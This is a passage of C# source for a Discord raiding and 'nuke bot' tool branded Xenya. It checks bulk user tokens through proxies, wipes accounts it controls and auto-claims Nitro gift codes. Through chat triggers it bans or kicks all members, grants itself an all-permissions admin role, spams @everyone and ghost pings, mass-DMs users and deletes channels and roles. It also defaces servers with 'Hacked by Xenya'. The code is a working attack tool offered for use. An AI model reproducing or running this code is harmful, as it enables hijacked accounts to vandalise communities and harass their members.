                    if (metroCheckBox121.Checked)
                    {
                        if (Utils.IsTokenVerified(metroTextBox47.Text, theProxy[0], theProxy[1]))
                        {
                            MessageBox.Show("This user token is valid and verified!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show("This user token is valid but unverified!", Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        }
                    }
                    else
                    {
                        MessageBox.Show("This user token is valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
                else
                {
                    MessageBox.Show("This user token is not valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                if (Utils.IsTokenValid(metroTextBox47.Text))
                {
                    if (metroCheckBox121.Checked)
                    {
                        if (Utils.IsTokenVerified(metroTextBox47.Text))
                        {
                            MessageBox.Show("This user token is valid and verified!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show("This user token is valid but unverified!", Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        }
                    }
                    else
                    {
                        MessageBox.Show("This user token is valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
                else
                {
                    MessageBox.Show("This user token is not valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show("This user token is not valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    private void metroButton59_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (string line in metroTextBox48.Lines)
            {
                try
                {
                    if (!(line.Replace(" ", "") == ""))
                    {
                        try
                        {
                            discordClient.JoinGuild(Utils.GetInviteCodeByInviteLink(line));
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton60_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (string line in metroTextBox48.Lines)
            {
                try
                {
                    if (!(line.Replace(" ", "") == ""))
                    {
                        try
                        {
                            discordClient.JoinGroup(Utils.GetInviteCodeByInviteLink(line));
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton61_Click(object sender, EventArgs e)
    {
        try
        {
            if (openFileDialog2.ShowDialog() == DialogResult.OK)
            {
                metroTextBox48.Text = System.IO.File.ReadAllText(openFileDialog2.FileName);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton62_Click(object sender, EventArgs e)
    {
        try
        {
            if (openFileDialog2.ShowDialog() == DialogResult.OK)
            {
                metroTextBox49.Text = System.IO.File.ReadAllText(openFileDialog2.FileName);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton63_Click(object sender, EventArgs e)
    {
        if (metroButton63.Text.StartsWith("Check"))
        {
            metroButton63.Text = "Stop checking all of these tokens";
            tokenChecker = new Thread(new ThreadStart(doTokenChecking));
            tokenChecker.Start();
        }
        else
        {
            metroButton63.Text = "Check all of these tokens";
            tokenChecker.Abort();
        }
    }
    private void metroButton64_Click(object sender, EventArgs e)
    {
        try
        {
            if (saveFileDialog2.ShowDialog() == DialogResult.OK)
            {
                System.IO.File.WriteAllText(openFileDialog2.FileName, metroTextBox50.Text);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton65_Click(object sender, EventArgs e)
    {
        try
        {
            if (openFileDialog2.ShowDialog() == DialogResult.OK)
            {
                metroTextBox51.Text = System.IO.File.ReadAllText(openFileDialog2.FileName);
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doTokenChecking()
    {
        try
        {
            foreach (string line in metroTextBox49.Lines)
            {
                try
                {
                    if (!(line.Replace(" ", "") == ""))
                    {
                        try
                        {
                            bool valid = false;
                            try
                            {
                                if (metroCheckBox47.Checked)
                                {
                                    string[] theProxy = GetRandomProxy();
                                    valid = metroCheckBox122.Checked ? Utils.IsTokenVerified(line, theProxy[0], theProxy[1]) : Utils.IsTokenValid(line, theProxy[0], theProxy[1]);
                                }
                                else
                                {
                                    valid = metroCheckBox122.Checked ? Utils.IsTokenVerified(line) : Utils.IsTokenValid(line);
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                            if (valid)
                            {
                                if (metroTextBox50.Text == "")
                                {
                                    metroTextBox50.Text = line;
                                }
                                else
                                {
                                    metroTextBox50.Text += Environment.NewLine + line;
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
        metroButton63.Text = "Check all of these tokens";
    }
    public void doAccountNuker()
    {
        try
        {
            if (metroCheckBox42.Checked)
            {
                try
                {

                    MemoryStream ms = new MemoryStream();
                    Resources.xenya.Save(Application.StartupPath + "\\temp.png", System.Drawing.Imaging.ImageFormat.Png);
                    Thread.Sleep(1000);
                    theSocketClient.CurrentUser.ModifyAsync(x =>
                    {
                        x.Avatar = new Image(Application.StartupPath + "\\temp.png");
                    });
                    Thread.Sleep(1000);
                    System.IO.File.Delete(Application.StartupPath + "\\temp.png");
                }
                catch (Exception ex)
                {
                }
            }
            if (metroCheckBox43.Checked)
            {
                try
                {
                    foreach (SocketGroupChannel group in theSocketClient.GroupChannels)
                    {
                        try
                        {
                            group.LeaveAsync();
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
            if (metroCheckBox44.Checked)
            {
                try
                {
                    foreach (SocketGuild guild in theSocketClient.Guilds)
                    {
                        try
                        {
                            guild.DeleteAsync();
                        }
                        catch (Exception ex)
                        {
                        }
                        try
                        {
                            guild.LeaveAsync();
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
            if (metroCheckBox45.Checked)
            {
                try
                {
                    foreach (Relationship relationship in discordClient.GetRelationships())
                    {
                        try
                        {
                            relationship.Remove();
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
            if (metroCheckBox46.Checked)
            {
                try
                {
                    for (int i = 0; i < 100; i++)
                    {
                        try
                        {
                            discordClient.CreateGuild(Utils.RandomNormalString(32));
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private async Task theSocketClient_MessageReceived(SocketMessage arg)
    {
        if (!isBot)
        {
            if (metroButton138.Enabled)
            {
                try
                {
                    string content = arg.Content.Replace(" ", "").Replace(Environment.NewLine, "").Replace(Constants.vbTab, "").ToLower();
                    if (content.Contains("discordapp.com/gifts/"))
                    {
                        string[] splitter = Strings.Split(content, "discordapp.com/gifts/");
                        string code = splitter[1].Replace("/", "").Replace(" ", "").Replace(Constants.vbTab, "").Substring(0, 16);
                        Discord.REQ.Nitro.Claim(code, discordClient.Token);
                    }
                    else if (content.Contains("discord.gift/"))
                    {
                        string[] splitter = Strings.Split(content, "discord.gift/");
                        string code = splitter[1].Replace("/", "").Replace(" ", "").Replace(Constants.vbTab, "").Substring(0, 16);
                        Discord.REQ.Nitro.Claim(code, discordClient.Token);
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        if (metroButton148.Enabled)
        {
            if (arg.Author.Id == theSocketClient.CurrentUser.Id)
            {
                await arg.DeleteAsync();
                return;
            }
        }
        if (metroCheckBox8.Checked)
        {
            if (!arg.Channel.Name.StartsWith("@") & !arg.Channel.Name.Contains("#"))
            {
                if (!(arg.Author.Id == theSocketClient.CurrentUser.Id) & !arg.Author.IsBot)
                {
                    string trigger = metroTextBox19.Text;
                    if (arg.Content.ToLower().StartsWith(trigger))
                    {
                        await arg.DeleteAsync();
                        SocketGuildChannel currentChannel = (SocketGuildChannel)arg.Channel;
                        ISocketMessageChannel channel = arg.Channel;
                        SocketGuild guild = currentChannel.Guild;
                        SocketTextChannel textChannel = guild.GetTextChannel(channel.Id);
                        string textMessage = arg.Content;
                        textMessage = textMessage.Replace("%LAG_MESSAGE%", Utils.GetLagString());
                        string lowerMessage = textMessage.ToLower();
                        string theCommand = textMessage.Substring(1, textMessage.Length - 1);
                        string theCommandLower = theCommand.ToLower();
                        var args = Microsoft.VisualBasic.Strings.Split(theCommand);
                        var argsLower = Microsoft.VisualBasic.Strings.Split(theCommandLower);
                        SocketUser user = arg.Author;
                        SocketGuildUser guildUser = null;
                        foreach (SocketGuildUser socketGuildUser in guild.Users)
                        {
                            if (user.Id == socketGuildUser.Id)
                            {
                                guildUser = socketGuildUser;
                                break;
                            }
                        }
                        if (theCommandLower == "help" && metroCheckBox9.Checked)
                        {
                            string totalCommands1 = "";
                            string totalCommands2 = "";
                            if (metroCheckBox9.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**help** - Get the list of all nuke bot commands can do for you.";
                            }
                            if (metroCheckBox10.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**servername** [new server name] - Change the name of the server.";
                            }
                            if (metroCheckBox11.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**text** [channels] [name] - Create a specific amount of text channels with a specified name.";
                            }
                            if (metroCheckBox12.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**voice** [channels] [name] - Create a specific amount of voice channels with a specified name.";
                            }
                            if (metroCheckBox13.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**kickall** [reason] - Kick all users with a specified reason.";
                            }
                            if (metroCheckBox14.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**banall** [reason] - Ban all users with a specified reason.";
                            }
                            if (metroCheckBox15.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**nickname** [new nick name] - Set the nick name of all users of the guild to the specified nick name.";
                            }
                            if (metroCheckBox16.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**icon** - Set the server icon to the Xenya icon.";
                            }
                            if (metroCheckBox17.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**role** [roles] [name] - Create a specific amount of roles with a specified name.";
                            }
                            if (metroCheckBox18.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**unbanall** - Unban all banned users from the server.";
                            }
                            if (metroCheckBox19.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**dm** [message] - Send a private message to all users of the server.";
                            }
                            if (metroCheckBox20.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**pings** [num] - Send @everyone pings in all channels.";
                            }
                            if (metroCheckBox21.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**ghostpings** [num] - Send invisible @everyone pings in all channels.";
                            }
                            if (metroCheckBox22.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**msgspam** [num] [message] - Spam a single message in all channels.";
                            }
                            if (metroCheckBox23.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**lag** [num] - Send lag messages in all channels with mentions.";
                            }
                            if (metroCheckBox24.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**nuke** - Delete all server channels, ban every possible user in the server, create a unique channel with images, mentions and lag messages.";
                            }
                            if (metroCheckBox25.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**raid** - Complete raid by Xenya: delete all server channels, ban every possible user in the server, delete all roles, change server name, create a unique channel with images, mentions and lag messages, create single channel to do the 'Xenya' spelling. In ending, spam lag messages and mentions in all new channels.";
                            }
                            if (metroCheckBox26.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**delroles** - Delete all roles in the server.";
                            }
                            if (metroCheckBox27.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**deltxt** - Delete all text channels in the server.";
                            }
                            if (metroCheckBox28.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**delvc** - Delete all vocal channels in the server.";
                            }
                            if (metroCheckBox56.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**admin** - Create an admin role and automatically obtain that. You will get all possible permissions.";
                            }
                            if (metroCheckBox73.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**del** - Delete the current active text channel.";
                            }
                            if (metroCheckBox74.Checked)
                            {
                                totalCommands1 += Environment.NewLine + trigger + "**topic** [new topic] - Change the topic to all server text channels.";
                            }
                            if (metroCheckBox79.Checked)
                            {
                                totalCommands2 += Environment.NewLine + trigger + "**deltopic** [new topic] - Remove the topic from all server text channels.";
                            }
                            if (metroCheckBox80.Checked)
                            {
                                if (string.IsNullOrEmpty(totalCommands1))
                                {
                                    var embed = new EmbedBuilder();
                                    embed.WithColor(new Color(204, 0, 0));
                                    embed.WithTitle("Nuke Bot commands (by Xenya :3) [Page 1]");
                                    embed.WithDescription("*No commands available.*");
                                    await user.SendMessageAsync("", false, embed.Build());
                                }
                                else
                                {
                                    var embed = new EmbedBuilder();
                                    embed.WithColor(new Color(204, 0, 0));
                                    embed.WithTitle("Nuke Bot commands (by Xenya :3) [Page 1]");
                                    embed.WithDescription("Here is the list of the commands of this nuke bot:" + Environment.NewLine + totalCommands1);
                                    await user.SendMessageAsync("", false, embed.Build());
                                }
                            }
                            if (metroCheckBox81.Checked)
                            {
                                if (string.IsNullOrEmpty(totalCommands2))
                                {
                                    var embed = new EmbedBuilder();
                                    embed.WithColor(new Color(204, 0, 0));
                                    embed.WithTitle("Nuke Bot commands (by Xenya :3) [Page 2]");
                                    embed.WithDescription("*No commands available.*");
                                    await user.SendMessageAsync("", false, embed.Build());
                                }
                                else
                                {
                                    var embed = new EmbedBuilder();
                                    embed.WithColor(new Color(204, 0, 0));
                                    embed.WithTitle("Nuke Bot commands (by Xenya :3) [Page 2]");
                                    embed.WithDescription("Here is the list of the commands of this nuke bot:" + Environment.NewLine + totalCommands2);
                                    await user.SendMessageAsync("", false, embed.Build());
                                }
                            }
                        }
                        else if (theCommandLower == "admin" && metroCheckBox56.Checked)
                        {
                            try
                            {
                                try
                                {
                                    GuildPermissions all = GuildPermissions.All;
                                    await guild.CreateRoleAsync("*", new GuildPermissions?(all), null, false, null);
                                }
                                catch (Exception ex)
                                {
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                            await Task.Delay(1500);
                            foreach (SocketRole socketRole in guild.Roles)
                            {
                                if (socketRole.Name == "*")
                                {
                                    await guildUser.AddRoleAsync(socketRole);
                                    return;
                                }
                            }
                        }
                        else if (theCommandLower.StartsWith("servername ") && metroCheckBox10.Checked)
                        {
                            try
                            {
                                string newName = GetOtherMessage(theCommand, "servername ");
                                await guild.ModifyAsync(x => x.Name = newName);
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "servername" && metroCheckBox10.Checked)
                        {
                            try
                            {
                                string newName = "Hacked by Xenya";
                                if (!(metroTextBox20.Text.Replace(" ", "") == ""))
                                {
                                    newName = metroTextBox20.Text;
                                }
                                await guild.ModifyAsync(x => x.Name = newName);
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("text ") && metroCheckBox11.Checked)
                        {
                            try
                            {
                                string textChannels = GetOtherMessage(theCommand, "text ");
                                if (textChannels.Contains(" "))
                                {
                                    var splitter = Strings.Split(textChannels, " ");
                                    if (Information.IsNumeric(splitter[0]))
                                    {
                                        for (int i = 0, loopTo = int.Parse(splitter[0]) - 1; i <= loopTo; i++)
                                            await guild.CreateTextChannelAsync(splitter[1]);
                                        return;
                                    }
                                    else if (Information.IsNumeric(metroTextBox21.Text))
                                    {
                                        for (int i = 0, loopTo1 = int.Parse(metroTextBox21.Text) - 1; i <= loopTo1; i++)
                                            await guild.CreateTextChannelAsync(textChannels);
                                    }
                                    else
                                    {
                                        await guild.CreateTextChannelAsync(textChannels);
                                    }
                                }

                                if (!Information.IsNumeric(textChannels))
                                {
                                    if (Information.IsNumeric(metroTextBox21.Text))
                                    {
                                        for (int i = 0, loopTo2 = int.Parse(metroTextBox21.Text) - 1; i <= loopTo2; i++)
                                            await guild.CreateTextChannelAsync(textChannels);
                                    }
                                    else
                                    {
                                        await guild.CreateTextChannelAsync(textChannels);
                                    }
                                }
                                else
                                {
                                    for (int i = 0, loopTo3 = int.Parse(textChannels) - 1; i <= loopTo3; i++)
                                    {
                                        if (!(metroTextBox22.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                        {
                                            await guild.CreateTextChannelAsync(metroTextBox22.Text);
                                        }
                                        else
                                        {
                                            await guild.CreateTextChannelAsync("hacked-by-xenya");
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "text" && metroCheckBox11.Checked)
                        {
                            try
                            {
                                int num = 1;
                                if (Information.IsNumeric(metroTextBox21.Text))
                                {
                                    num = int.Parse(metroTextBox21.Text);
                                }

                                string name = "hacked-by-xenya";
                                if (!(metroTextBox22.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                {
                                    name = metroTextBox22.Text;
                                }

                                for (int i = 0, loopTo4 = num - 1; i <= loopTo4; i++)
                                    await guild.CreateTextChannelAsync(name);
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("voice ") && metroCheckBox12.Checked)
                        {
                            try
                            {
                                string voiceChannels = GetOtherMessage(theCommand, "voice ");
                                if (voiceChannels.Contains(" "))
                                {
                                    var splitter = Strings.Split(voiceChannels, " ");
                                    if (Information.IsNumeric(splitter[0]))
                                    {
                                        for (int i = 0, loopTo5 = int.Parse(splitter[0]) - 1; i <= loopTo5; i++)
                                            await guild.CreateVoiceChannelAsync(splitter[1]);
                                        return;
                                    }
                                    else if (Information.IsNumeric(metroTextBox23.Text))
                                    {
                                        for (int i = 0, loopTo6 = int.Parse(metroTextBox23.Text) - 1; i <= loopTo6; i++)
                                            await guild.CreateVoiceChannelAsync(voiceChannels);
                                    }
                                    else
                                    {
                                        await guild.CreateVoiceChannelAsync(voiceChannels);
                                    }
                                }

                                if (!Information.IsNumeric(voiceChannels))
                                {
                                    if (Information.IsNumeric(metroTextBox23.Text))
                                    {
                                        for (int i = 0, loopTo7 = int.Parse(metroTextBox23.Text) - 1; i <= loopTo7; i++)
                                            await guild.CreateVoiceChannelAsync(voiceChannels);
                                    }
                                    else
                                    {
                                        await guild.CreateVoiceChannelAsync(voiceChannels);
                                    }
                                }
                                else
                                {
                                    for (int i = 0, loopTo8 = int.Parse(voiceChannels) - 1; i <= loopTo8; i++)
                                    {
                                        if (!(metroTextBox24.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                        {
                                            await guild.CreateVoiceChannelAsync(metroTextBox24.Text);
                                        }
                                        else
                                        {
                                            await guild.CreateVoiceChannelAsync("Hacked by Xenya");
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "voice" && metroCheckBox12.Checked)
                        {
                            try
                            {
                                int num = 1;
                                if (Information.IsNumeric(metroTextBox23.Text))
                                {
                                    num = int.Parse(metroTextBox23.Text);
                                }

                                string name = "hacked-by-xenya";
                                if (!(metroTextBox24.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                {
                                    name = metroTextBox24.Text;
                                }

                                for (int i = 0, loopTo9 = num - 1; i <= loopTo9; i++)
                                    await guild.CreateVoiceChannelAsync(name);
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("kickall ") && metroCheckBox13.Checked)
                        {
                            try
                            {
                                string kickReason = GetOtherMessage(theCommand, "kickall ");
                                foreach (SocketGuildUser userino in guild.Users)
                                {
                                    try
                                    {
                                        await userino.KickAsync(kickReason);
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "kickall" && metroCheckBox13.Checked)
                        {
                            try
                            {
                                if (!(metroTextBox25.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                {
                                    foreach (SocketGuildUser userino in guild.Users)
                                    {
                                        try
                                        {
                                            await userino.KickAsync(metroTextBox25.Text);
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                                else
                                {
                                    foreach (SocketGuildUser userino in guild.Users)
                                    {
                                        try
                                        {
                                            await userino.KickAsync();
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("banall ") && metroCheckBox14.Checked)
                        {
                            try
                            {
                                string banReason = GetOtherMessage(theCommand, "banall ");
                                foreach (SocketGuildUser userino in guild.Users)
                                {
                                    try
                                    {
                                        await guild.AddBanAsync(userino, 7, banReason);
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "banall" && metroCheckBox14.Checked)
                        {
                            try
                            {
                                if (!(metroTextBox26.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                {
                                    foreach (SocketGuildUser userino in guild.Users)
                                    {
                                        try
                                        {
                                            await guild.AddBanAsync(userino, 7, metroTextBox26.Text);
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                                else
                                {
                                    foreach (SocketGuildUser userino in guild.Users)
                                    {
                                        try
                                        {
                                            await guild.AddBanAsync(userino, 7);
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("nickname ") && metroCheckBox15.Checked)
                        {
                            try
                            {
                                string newNickName = GetOtherMessage(theCommand, "nickname ");
                                foreach (SocketGuildUser userino in guild.Users)
                                {
                                    try
                                    {
                                        await userino.ModifyAsync(x => x.Nickname = newNickName);
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "nickname" && metroCheckBox15.Checked)
                        {
                            try
                            {
                                string newNickName = "Hacked by Xenya";
                                if (!(metroTextBox30.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                {
                                    newNickName = metroTextBox30.Text;
                                }

                                foreach (SocketGuildUser userino in guild.Users)
                                {
                                    try
                                    {
                                        await userino.ModifyAsync(x => x.Nickname = newNickName);
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "icon" && metroCheckBox16.Checked)
                        {
                            try
                            {
                                MemoryStream ms = new MemoryStream();
                                Resources.xenya.Save(Application.StartupPath + "\\temp.png", System.Drawing.Imaging.ImageFormat.Png);
                                await Task.Delay(1000);
                                await guild.ModifyAsync(x => x.Icon = new Image(Application.StartupPath + "\\temp.png"));
                                await Task.Delay(1000);
                                System.IO.File.Delete(Application.StartupPath + "\\temp.png");
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("role ") && metroCheckBox17.Checked)
                        {
                            try
                            {
                                string roles = GetOtherMessage(theCommand, "role ");
                                if (roles.Contains(" "))
                                {
                                    var splitter = Strings.Split(roles, " ");
                                    if (Information.IsNumeric(splitter[0]))
                                    {
                                        for (int i = 0, loopTo10 = int.Parse(splitter[0]) - 1; i <= loopTo10; i++)
                                            await guild.CreateRoleAsync(splitter[1]);
                                        return;
                                    }
                                    else if (Information.IsNumeric(metroTextBox28.Text))
                                    {
                                        for (int i = 0, loopTo11 = int.Parse(metroTextBox28.Text) - 1; i <= loopTo11; i++)
                                            await guild.CreateRoleAsync(roles);
                                    }
                                    else
                                    {
                                        await guild.CreateRoleAsync(roles);
                                    }
                                }

                                if (!Information.IsNumeric(roles))
                                {
                                    if (Information.IsNumeric(metroTextBox28.Text))
                                    {
                                        for (int i = 0, loopTo12 = int.Parse(metroTextBox28.Text) - 1; i <= loopTo12; i++)
                                            await guild.CreateRoleAsync(roles);
                                    }
                                    else
                                    {
                                        await guild.CreateRoleAsync(roles);
                                    }
                                }
                                else
                                {
                                    for (int i = 0, loopTo13 = int.Parse(roles) - 1; i <= loopTo13; i++)
                                    {
                                        if (!(metroTextBox29.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                        {
                                            await guild.CreateRoleAsync(metroTextBox29.Text);
                                        }
                                        else
                                        {
                                            await guild.CreateRoleAsync("Hacked by Xenya");
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "role" && metroCheckBox17.Checked)
                        {
                            try
                            {
                                int num = 1;
                                if (Information.IsNumeric(metroTextBox28.Text))
                                {
                                    num = int.Parse(metroTextBox28.Text);
                                }

                                string name = "Hacked by Xenya";
                                if (!(metroTextBox29.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                {
                                    name = metroTextBox29.Text;
                                }

                                for (int i = 0, loopTo14 = num - 1; i <= loopTo14; i++)
                                    await guild.CreateRoleAsync(name);
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "unbanall" && metroCheckBox18.Checked)
                        {
                            try
                            {
                                foreach (Discord.Rest.RestBan restBan in guild.GetBansAsync().Result)
                                {
                                    try
                                    {
                                        await guild.RemoveBanAsync(restBan.User);
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("dm ") && metroCheckBox19.Checked)
                        {
                            try
                            {
                                string theMessage = GetOtherMessage(theCommand, "dm ");
                                foreach (SocketGuildUser userino in guild.Users)
                                {
                                    try
                                    {
                                        if (!(userino.Id == theSocketClient.CurrentUser.Id))
                                        {
                                            await userino.SendMessageAsync(theMessage);
                                            await Task.Delay(650);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "dm" && metroCheckBox19.Checked)
                        {
                            try
                            {
                                string theMessage = "Hacked by Xenya :3";
                                if (!(metroTextBox31.Text.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                                {
                                    theMessage = metroTextBox31.Text;
                                }

                                foreach (SocketGuildUser userino in guild.Users)
                                {
                                    try
                                    {
                                        if (!(userino.Id == theSocketClient.CurrentUser.Id))
                                        {
                                            await userino.SendMessageAsync(theMessage);
                                            await Task.Delay(650);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("pings ") && metroCheckBox20.Checked)
                        {
                            try
                            {
                                int thePings = 1;
                                string otherMessage = GetOtherMessage(theCommand, "pings ");
                                if (Information.IsNumeric(otherMessage))
                                {
                                    thePings = int.Parse(otherMessage);
                                }
                                else if (Information.IsNumeric(metroTextBox32.Text))
                                {
                                    thePings = int.Parse(metroTextBox32.Text);
                                }

                                for (int i = 0, loopTo15 = thePings - 1; i <= loopTo15; i++)
                                {
                                    try
                                    {
                                        foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                        {
                                            try
                                            {
                                                await textChannelino.SendMessageAsync("@everyone");
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "pings" && metroCheckBox20.Checked)
                        {
                            try
                            {
                                int thePings = 1;
                                if (Information.IsNumeric(metroTextBox32.Text))
                                {
                                    thePings = int.Parse(metroTextBox32.Text);
                                }

                                for (int i = 0, loopTo16 = thePings - 1; i <= loopTo16; i++)
                                {
                                    try
                                    {
                                        foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                        {
                                            try
                                            {
                                                await textChannelino.SendMessageAsync("@everyone");
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("ghostpings ") && metroCheckBox21.Checked)
                        {
                            try
                            {
                                int thePings = 1;
                                string otherMessage = GetOtherMessage(theCommand, "ghostpings ");
                                if (Information.IsNumeric(otherMessage))
                                {
                                    thePings = int.Parse(otherMessage);
                                }
                                else if (Information.IsNumeric(metroTextBox33.Text))
                                {
                                    thePings = int.Parse(metroTextBox33.Text);
                                }

                                for (int i = 0, loopTo17 = thePings - 1; i <= loopTo17; i++)
                                {
                                    try
                                    {
                                        foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                        {
                                            try
                                            {
                                                Discord.Rest.RestUserMessage message = textChannelino.SendMessageAsync("@everyone").Result;
                                                await message.DeleteAsync();
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower == "ghostpings" && metroCheckBox21.Checked)
                        {
                            try
                            {
                                int thePings = 1;
                                if (Information.IsNumeric(metroTextBox33.Text))
                                {
                                    thePings = int.Parse(metroTextBox33.Text);
                                }

                                for (int i = 0, loopTo18 = thePings - 1; i <= loopTo18; i++)
                                {
                                    try
                                    {
                                        foreach (SocketTextChannel textChannelino in guild.TextChannels)
                                        {
                                            try
                                            {
                                                Discord.Rest.RestUserMessage message = textChannelino.SendMessageAsync("@everyone").Result;
                                                await message.DeleteAsync();
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        else if (theCommandLower.StartsWith("msgspam ") && metroCheckBox22.Checked)
                        {
                            try
                            {
                                string messages = GetOtherMessage(theCommand, "msgspam ");
                                if (messages.Contains(" "))
                                {
